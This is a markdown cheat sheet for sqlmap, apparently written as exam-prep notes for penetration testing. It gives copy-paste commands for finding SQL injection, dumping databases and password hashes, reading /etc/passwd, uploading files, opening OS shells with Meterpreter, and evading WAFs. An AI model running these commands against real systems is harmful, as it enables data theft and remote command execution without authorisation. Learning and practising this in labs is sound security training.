# sqlmap — automated SQL injection

> **The big one for web questions.** If a form, URL param, or cookie looks fishy, sqlmap is your answer. Learn the flow: detect → enumerate DBs → tables → columns → dump.

**Install check (Parrot — already installed):** `sqlmap --version`

---

## 🎯 Cheat-flow: "What do I run?"

| You need to... | Run this | Why |
|---|---|---|
| Test a GET param | `sqlmap -u "http://<URL>/page.php?id=1" --batch` | Default detect |
| Test a POST form | `sqlmap -u "<URL>" --data "user=a&pass=b" --batch` | `--data` = POST body |
| Test behind login | `sqlmap -u "<URL>" --cookie "PHPSESSID=abc" --batch` | Reuse session |
| **List databases** | `sqlmap -u "<URL>" --dbs --batch` | First enum step |
| **List tables** in a DB | `sqlmap -u "<URL>" -D <db> --tables --batch` | Pick the juicy DB |
| List columns | `sqlmap -u "<URL>" -D <db> -T <table> --columns --batch` | Before dumping |
| **Dump a table** | `sqlmap -u "<URL>" -D <db> -T <table> --dump --batch` | Common exam answer |
| Dump everything | `sqlmap -u "<URL>" --dump-all --batch` | Noisy but thorough |
| Get OS shell | `sqlmap -u "<URL>" --os-shell --batch` | Needs FILE priv / stacked queries |
| Read a file | `sqlmap -u "<URL>" --file-read=/etc/passwd --batch` | MySQL FILE priv |
| Crank detection | `sqlmap -u "<URL>" --level 5 --risk 3 --batch` | When default misses it |
| Bypass WAF | `sqlmap -u "<URL>" --tamper=space2comment --batch` | See tamper list |

---

## 🔑 Flags you must know cold

### Target
| Flag | Meaning |
|---|---|
| `-u "<URL>"` | Target URL (quote it!) |
| `--data "k=v&k2=v2"` | POST body — triggers POST mode |
| `--cookie "name=val"` | Send cookie (auth / WAF) |
| `--user-agent "..."` | Custom UA |
| `--random-agent` | Random UA from list |
| `--headers "X: y"` | Extra headers |
| `-r request.txt` | Load a raw Burp request (easiest for complex auth) |
| `-p <param>` | Only test this parameter |
| `--method POST` | Force method |

### Detection
| Flag | Meaning |
|---|---|
| `--level 1..5` | How thorough (default 1; 3+ tests headers, cookie) |
| `--risk 1..3` | How dangerous (default 1; 3 includes OR-based, can UPDATE) |
| `--dbms mysql` | Skip fingerprint, force DBMS |
| `--technique BEUSTQ` | B=boolean U=union E=error S=stacked T=time Q=inline |
| `--prefix` / `--suffix` | Wrap payloads (rare) |

### Enumeration
| Flag | Meaning |
|---|---|
| `--dbs` | List databases |
| `--current-db` | Current DB name |
| `--current-user` | DB user |
| `--users` | All DB users |
| `--passwords` | User password hashes |
| `--privileges` | User privileges |
| `--tables` | List tables (scope with `-D`) |
| `--columns` | List columns (scope with `-D -T`) |
| `--schema` | Full schema |
| `--dump` | Dump rows |
| `--dump-all` | Dump everything |
| `-D <db>` | Scope to database |
| `-T <table>` | Scope to table |
| `-C col1,col2` | Scope to columns |

### Exploitation
| Flag | Meaning |
|---|---|
| `--os-shell` | Interactive OS shell (needs write perms / stacked) |
| `--os-cmd "<cmd>"` | One-shot OS command |
| `--os-pwn` | Meterpreter / VNC |
| `--file-read=<path>` | Read remote file |
| `--file-write=<local>` `--file-dest=<remote>` | Upload a file |
| `--sql-shell` | Interactive SQL prompt |
| `--sql-query "SELECT..."` | One-shot SQL |

### WAF bypass / tamper
| Flag | Meaning |
|---|---|
| `--tamper=<script>` | Apply tamper (comma-list ok) |
| `--list-tampers` | Show all tamper scripts |
| `--random-agent` | Helps with dumb WAFs |
| `--proxy http://127.0.0.1:8080` | Route through Burp |
| `--delay 1` `--timeout 30` | Slow down |

**Common tampers to remember:** `space2comment`, `between`, `randomcase`, `charencode`, `apostrophemask`, `space2hash`, `equaltolike`.

### Quality of life
| Flag | Meaning |
|---|---|
| `--batch` | **Never ask questions** — always default. Use it every time in the exam. |
| `--flush-session` | Forget previous run (retest from scratch) |
| `--fresh-queries` | Ignore cached results |
| `--threads 10` | Speed up (max 10) |
| `-v 3` | Show payloads |
| `--dbms-cred user:pass` | Provide DB creds |

---

## 🧪 The sqlmap flow (memorize this)

```
1. Detect          sqlmap -u "<URL>" --batch
2. --dbs           List databases
3. -D <db> --tables
4. -D <db> -T <tbl> --columns
5. -D <db> -T <tbl> --dump
```

If step 1 returns "not injectable", bump `--level 5 --risk 3` and/or add `--tamper`.

---

## 📋 Command recipes (copy-paste)

```bash
# 1. Quick GET param test
sqlmap -u "http://<IP>/item.php?id=1" --batch

# 2. POST form login
sqlmap -u "http://<IP>/login.php" --data "username=admin&password=x" --batch

# 3. Authenticated (grab cookie from browser devtools)
sqlmap -u "http://<IP>/profile.php?uid=1" --cookie "PHPSESSID=abcd1234" --batch

# 4. From a saved Burp request (easiest for weird apps)
sqlmap -r req.txt --batch --dbs

# 5. Full enum pipeline
sqlmap -u "http://<IP>/item.php?id=1" --batch --dbs
sqlmap -u "http://<IP>/item.php?id=1" --batch -D acme --tables
sqlmap -u "http://<IP>/item.php?id=1" --batch -D acme -T users --columns
sqlmap -u "http://<IP>/item.php?id=1" --batch -D acme -T users --dump

# 6. Dump users+passwords in one go
sqlmap -u "http://<IP>/item.php?id=1" --batch -D acme -T users -C username,password --dump

# 7. OS shell on MySQL (needs FILE privilege + writable web root)
sqlmap -u "http://<IP>/item.php?id=1" --batch --os-shell

# 8. One-shot RCE
sqlmap -u "http://<IP>/item.php?id=1" --batch --os-cmd "id"

# 9. Read a file
sqlmap -u "http://<IP>/item.php?id=1" --batch --file-read=/etc/passwd

# 10. Heavy detection on a stubborn target
sqlmap -u "http://<IP>/search.php?q=test" --level 5 --risk 3 \
       --tamper=space2comment,between --batch

# 11. Force technique (time-based blind only)
sqlmap -u "http://<IP>/item.php?id=1" --technique=T --batch

# 12. Proxy through Burp
sqlmap -u "http://<IP>/item.php?id=1" --proxy http://127.0.0.1:8080 --batch
```

---

## ⚠️ Gotchas

- **Always use `--batch`** in the exam — sqlmap prompts for input otherwise and you'll waste time.
- **Quote the URL.** `&` in an unquoted URL will background the process.
- **Use `-r req.txt`** when login / CSRF tokens / headers get complicated — save the request from Burp, done.
- **"Not injectable" at default level** → bump `--level 3` (tests cookies + UA) or `--level 5 --risk 3`.
- **Session cache confuses you** → `--flush-session` to retest cleanly.
- **`--os-shell` needs stacked queries or MySQL FILE privilege + writable web root.** If it fails, fall back to `--sql-shell` or `--file-read`.
- **Dump location:** results saved to `~/.local/share/sqlmap/output/<host>/` (older versions: `~/.sqlmap/output/`). The dumped CSV is often the exam answer.
- **Password hashes** — sqlmap offers to crack them with its built-in dict. Say yes (`--batch` does).
- **Answer format** — the exam usually wants the exact string from the dump (username, flag, hash). Copy it character-for-character.
- **WAF blocking you?** Try `--random-agent`, then `--tamper`, then drop `--threads` to 1.

---

## 🔗 Related

- [gobuster](gobuster.md) — find the endpoint first
- [ffuf](ffuf.md) — fuzz params before sqlmap
- [wpscan](wpscan.md) — WordPress-specific, chain into sqlmap for plugin SQLi
- [nikto](nikto.md) — baseline web scan
- [05-web-app domain README](../12-web-apps/README.md)
- [Web-app playbook](../playbooks/webapp-playbook.md)
